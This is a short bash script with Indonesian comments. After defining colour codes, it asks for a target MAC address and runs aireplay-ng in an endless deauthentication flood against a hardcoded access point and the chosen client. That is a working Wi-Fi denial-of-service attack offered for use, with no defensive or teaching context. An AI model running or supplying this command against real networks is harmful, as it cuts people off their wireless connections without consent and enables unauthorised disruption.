#!/bin/bash
#ROSI

#program sederhana 
#buatan arta wiguna
clear
#color
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"


read  -p "INPUT MAC Target :" monitor
sudo aireplay-ng --deauth 0 -a 50:64:2B:25:F8:AB -c $monitor --ignore-negative-one mon0
